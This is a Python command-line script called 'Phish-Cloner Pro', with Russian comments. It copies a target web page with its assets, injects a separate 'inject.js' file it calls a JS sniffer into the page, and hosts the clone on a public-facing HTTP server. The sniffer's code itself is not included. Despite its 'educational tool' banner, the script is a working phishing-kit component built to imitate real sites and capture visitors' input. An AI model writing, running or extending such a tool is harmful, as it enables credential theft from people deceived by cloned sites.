#!/usr/bin/env python3
"""
Phish-Cloner Pro — клонер + хостинг в одном флаконе (учебные цели)
"""

import os
import sys
import argparse
import http.server
import socketserver
import threading
from pathlib import Path
from urllib.parse import urljoin, urlparse

import httpx
from bs4 import BeautifulSoup
from colorama import init, Fore, Style

# Инициализируем colorama для Windows
init(autoreset=True)

# ------------------------------------------------------------
# Стильный вывод
# ------------------------------------------------------------
BANNER = fr"""
{Fore.CYAN}  ____  _     _     _       ____ _                  _               ____
 |  _ \| |__ (_)___| |__   / ___| | ___  _ __   ___| |_ ___ _ __   |  _ \ _ __ ___
 | |_) | '_ \| / __| '_ \ | |   | |/ _ \| '_ \ / _ \ __/ _ \ '__|  | |_) | '__/ _ \
 |  __/| | | | \__ \ | | || |___| | (_) | | | |  __/ ||  __/ |     |  __/| | | (_) |
 |_|   |_| |_|_|___/_| |_(_)____|_|\___/|_| |_|\___|\__\___|_|     |_|   |_|  \___/
{Style.RESET_ALL}
        {Fore.YELLOW}Phish-Cloner Pro | educational tool | use ethically{Style.RESET_ALL}
"""

def log_info(msg):
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {msg}")

def log_warn(msg):
    print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {msg}")

def log_error(msg):
    print(f"{Fore.RED}[✘]{Style.RESET_ALL} {msg}")

# ------------------------------------------------------------
# Конфигурация
# ------------------------------------------------------------
DEFAULT_INJECT_JS = Path(__file__).parent / "inject.js"
DEFAULT_OUTPUT = "./cloned"
EXCLUDED_EXTENSIONS = {'.mp4', '.webm', '.ogg', '.mp3', '.wav', '.flac'}

# ------------------------------------------------------------
# Утилиты для клонирования
# ------------------------------------------------------------
def safe_filename(url_path: str) -> str:
    if not url_path or url_path.endswith('/'):
        return "index.html"
    filename = url_path.strip('/').replace('/', '_')
    if '.' not in filename.split('/')[-1]:
        filename += '.html'
    return "".join(c for c in filename if c.isalnum() or c in "._-")

def resource_type_and_rel_path(tag, base_url):
    if tag.name == 'link' and tag.get('href'):
        url = urljoin(base_url, tag['href'])
        ext = os.path.splitext(urlparse(url).path)[1]
        if ext == '.css':
            return url, f"css/{os.path.basename(urlparse(url).path)}"
        else:
            return url, f"other/{os.path.basename(urlparse(url).path)}"
    elif tag.name in ('script', 'img', 'video', 'source', 'audio') and tag.get('src'):
        url = urljoin(base_url, tag['src'])
        ext = os.path.splitext(urlparse(url).path)[1].lower()
        if ext in EXCLUDED_EXTENSIONS:
            return None, None
        if ext == '.js':
            subdir = 'js'
        elif ext in ('.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico', '.webp'):
            subdir = 'images'
        elif ext == '.css':
            subdir = 'css'
        else:
            subdir = 'other'
        filename = os.path.basename(urlparse(url).path) or f"resource{ext}"
        return url, f"{subdir}/{filename}"
    return None, None

def download(client, url, dest_abs_path):
    try:
        resp = client.get(url, follow_redirects=True)
        if resp.status_code == 200:
            os.makedirs(os.path.dirname(dest_abs_path), exist_ok=True)
            with open(dest_abs_path, 'wb') as f:
                f.write(resp.content)
            return True
    except Exception as e:
        log_error(f"Ошибка при скачивании {url}: {e}")
    return False

# ------------------------------------------------------------
# Ядро клонирования
# ------------------------------------------------------------
def clone_page(target_url, output_dir=DEFAULT_OUTPUT,
               inject_js_path=None, localize_resources=True):
    print(BANNER)
    log_info(f"Клонирование страницы: {target_url}")

    client = httpx.Client(timeout=15, follow_redirects=True)

    resp = client.get(target_url)
    resp.raise_for_status()
    html = resp.text
    final_url = str(resp.url)

    soup = BeautifulSoup(html, 'html.parser')
    domain = urlparse(final_url).netloc.replace(':', '_')
    page_folder = Path(output_dir) / domain
    page_folder.mkdir(parents=True, exist_ok=True)

    # Сохраняем ресурсы
    if localize_resources:
        log_info("Поиск и скачивание ресурсов...")
        for tag in soup.find_all(['link', 'script', 'img', 'video', 'source', 'audio']):
            res_url, rel_path = resource_type_and_rel_path(tag, final_url)
            if not res_url or not rel_path:
                continue
            dest_abs = page_folder / rel_path
            if download(client, res_url, str(dest_abs)):
                log_info(f"  {res_url} -> {rel_path}")
                attr = 'href' if tag.name == 'link' else 'src'
                tag[attr] = rel_path

    # Внедрение JS-сниффера
    if inject_js_path:
        js_file = Path(inject_js_path)
        if js_file.is_file():
            log_info(f"Внедрение сниффера из {js_file.name}")
            dest_js = page_folder / 'inject.js'
            with open(js_file, 'r', encoding='utf-8') as f_in:
                js_code = f_in.read()
            with open(dest_js, 'w', encoding='utf-8') as f_out:
                f_out.write(js_code)

            script_tag = soup.new_tag('script', src='inject.js')
            if soup.body:
                soup.body.append(script_tag)
            else:
                if soup.head:
                    soup.head.append(script_tag)
                else:
                    soup.insert(0, script_tag)
        else:
            log_warn(f"JS-файл не найден: {inject_js_path} – сниффер не добавлен")

    # Сохраняем итоговый HTML
    index_path = page_folder / 'index.html'
    with open(index_path, 'w', encoding='utf-8') as f:
        f.write(str(soup))

    log_info(f"Клон сохранён в: {page_folder}")
    return str(page_folder)

# ------------------------------------------------------------
# Стильный HTTP-сервер
# ------------------------------------------------------------
class StyledHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    """Выводим красивые логи запросов."""
    def log_message(self, format, *args):
        # Цвет в зависимости от кода ответа
        status = getattr(self, 'log_code', 200)
        color = Fore.GREEN if status < 400 else Fore.YELLOW if status < 500 else Fore.RED
        print(f"{color}[{self.log_date_time_string()}]{Style.RESET_ALL} {args[0]}")

    def send_response(self, code, message=None):
        self.log_code = code  # запоминаем для логирования
        super().send_response(code, message)

def serve_directory(directory, port=8080):
    os.chdir(directory)
    handler = StyledHTTPRequestHandler
    with socketserver.TCPServer(("0.0.0.0", port), handler) as httpd:
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"  🚀 {Fore.GREEN}Хостинг запущен на http://localhost:{port}{Style.RESET_ALL}")
        print(f"  📁 Папка: {directory}")
        print(f"  {Fore.YELLOW}Нажми Ctrl+C для остановки{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Сервер остановлен.{Style.RESET_ALL}")
            httpd.server_close()

# ------------------------------------------------------------
# Главный CLI
# ------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="Phish-Cloner Pro – клонер + хостинг для учебных целей"
    )
    subparsers = parser.add_subparsers(dest='command', help='Команды')

    # --- clone ---
    clone_parser = subparsers.add_parser('clone', help='Клонировать страницу')
    clone_parser.add_argument('url', help='URL целевой страницы')
    clone_parser.add_argument('-o', '--output', default=DEFAULT_OUTPUT,
                              help='Папка для сохранения (по умолчанию cloned/)')
    clone_parser.add_argument('-j', '--inject-js', default=str(DEFAULT_INJECT_JS),
                              help='Путь к JS-снифферу')
    clone_parser.add_argument('--no-local', action='store_true',
                              help='Не локализовывать ресурсы')
    clone_parser.add_argument('--serve', type=int, metavar='PORT',
                              help='Порт для немедленного запуска сервера после клонирования')

    # --- serve ---
    serve_parser = subparsers.add_parser('serve', help='Запустить сервер для готового клона')
    serve_parser.add_argument('directory', nargs='?', default=None,
                              help='Папка с клоном (по умолчанию последний клон)')
    serve_parser.add_argument('-p', '--port', type=int, default=8080,
                              help='Порт сервера (по умолчанию 8080)')

    args = parser.parse_args()

    if args.command == 'clone':
        folder = clone_page(
            args.url,
            output_dir=args.output,
            inject_js_path=args.inject_js,
            localize_resources=not args.no_local
        )
        if args.serve:
            serve_directory(folder, port=args.serve)

    elif args.command == 'serve':
        directory = args.directory
        if not directory:
            # Ищем последнюю созданную папку в cloned/
            cloned_root = Path(DEFAULT_OUTPUT)
            if cloned_root.exists():
                subdirs = sorted(cloned_root.iterdir(), key=lambda p: p.stat().st_mtime, reverse=True)
                if subdirs:
                    directory = str(subdirs[0])
                    log_info(f"Автовыбор последнего клона: {directory}")
                else:
                    log_error("Нет клонов в папке cloned/. Укажите папку явно.")
                    sys.exit(1)
            else:
                log_error("Папка cloned/ не существует. Сначала выполните clone.")
                sys.exit(1)
        serve_directory(directory, port=args.port)

    else:
        print(BANNER)
        parser.print_help()

if __name__ == '__main__':
    main()